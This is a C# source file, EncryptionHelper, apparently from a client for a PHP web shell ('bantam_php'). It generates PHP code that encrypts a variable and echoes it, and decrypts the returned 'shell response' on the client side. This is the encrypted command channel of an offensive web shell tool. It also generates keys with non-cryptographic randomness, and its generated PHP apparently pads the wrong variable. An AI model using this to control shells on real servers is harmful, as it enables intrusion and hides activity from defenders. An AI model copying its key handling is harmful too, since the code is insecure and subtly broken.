using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace bantam_php
{
    class EncryptionHelper
    {
        /// <summary>
        /// todo dynamic and move to helpers
        /// </summary>
        public static string RandomizeEncryptionKey()
        {
            var rdm = new Random();

            int keyLength = 16;
            var charSet = "abcdefghijklmnopqrstuvwxyz";
            var stringResult = new char[keyLength];
 
            for (int i = 0; i < keyLength; i++) {
                stringResult[i] = charSet[rdm.Next(charSet.Length)];
            }
            return new string(stringResult);
        }

        /// <summary>
        /// todo dynamic and move to helpers
        /// </summary>
        /// <returns></returns>
        public static string RandomizeEncryptionIV()
        {
            var random = new Random();
            string s = string.Empty;
            for (int i = 0; i < 32; i++) {
                s = String.Concat(s, random.Next(10).ToString());
            }
            return s;
        }


        /// <summary>
        /// todo possibly kill  the encrytion if empty result
        /// </summary>
        /// <returns></returns>
        public static string EncryptPhpVariableAndEcho(string varName, ref string encryptionKey, ref string encryptionIV)
        {
            encryptionIV = EncryptionHelper.RandomizeEncryptionIV();
            encryptionKey = EncryptionHelper.RandomizeEncryptionKey();

            string encryption = @"$iv = '" + encryptionIV + "';" +
                "$key = '" + encryptionKey + "';" +
                "$block = mcrypt_get_block_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);" +
                varName + " = base64_encode(" + varName + ");" +
                "$pad = $block - (strlen(" + varName + ") % $block);" +
                "$result .= str_repeat(chr($pad), $pad);" +
                "$crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, " + varName  + ", MCRYPT_MODE_CBC, $iv);" +
                "echo base64_encode($crypttext);";

            return encryption;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="base64"></param>
        /// <returns></returns>
        public static string EncodeBase64Tostring(string base64)
        {
            if (string.IsNullOrEmpty(base64)) {
                return String.Empty;
            }

            var plainTextBytes = System.Text.Encoding.ASCII.GetBytes(base64);
            string b64Code = System.Convert.ToBase64String(plainTextBytes);
            return b64Code;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        public static byte[] DecodeBase64(string str)
        {
            if (string.IsNullOrEmpty(str)) {
                return null;
            }

            if (Regex.IsMatch(str, @"^[a-zA-Z0-9\+/]*={0,2}$")) {
                string cleanB64 = Regex.Replace(str, "[^a-zA-Z0-9+=/]", "");
                var decbuff = Convert.FromBase64String(cleanB64);
                return decbuff;
            } else {
                MessageBox.Show("Unable to decode response! - " + str, "Whoops!!");
                return null;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="response"></param>
        /// <returns></returns>
        static public string DecryptShellResponse(string response, string encryptionKey, string encryptionIV)
        {
            if (string.IsNullOrEmpty(response)) {
                return string.Empty;
            }

            var encryptedResult = DecodeBase64(response);

            if (encryptedResult == null) {
                return string.Empty;
            }

            var decryptedResult = DecryptRJ256(encryptedResult, encryptionKey, encryptionIV);

            if (string.IsNullOrEmpty(decryptedResult)) {
                return string.Empty;
            }

            var finalResult = DecodeBase64(decryptedResult);
            string resultString = System.Text.Encoding.UTF8.GetString(finalResult, 0, finalResult.Length);
            return resultString;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="cypher"></param>
        /// <param name="KeyString"></param>
        /// <param name="IVString"></param>
        /// <returns></returns>
        static public String DecryptRJ256(byte[] cypher, string KeyString, string IVString)
        {
            var sRet = "";
            var encoding = new UTF8Encoding();
            var Key = encoding.GetBytes(KeyString);
            var IV = encoding.GetBytes(IVString);

            using (var rj = new RijndaelManaged()) {
                try {
                    rj.Padding = PaddingMode.PKCS7;
                    rj.Mode = CipherMode.CBC;
                    rj.KeySize = 256;
                    rj.BlockSize = 256;
                    rj.Key = Key;
                    rj.IV = IV;
                    var ms = new MemoryStream(cypher);
                    using (var cs = new CryptoStream(ms, rj.CreateDecryptor(Key, IV), CryptoStreamMode.Read)) {
                        using (var sr = new StreamReader(cs)) {
                            sRet = sr.ReadLine();
                        }
                    }
                } finally {
                    rj.Clear();
                }
            }
            return sRet;
        }
    }
}
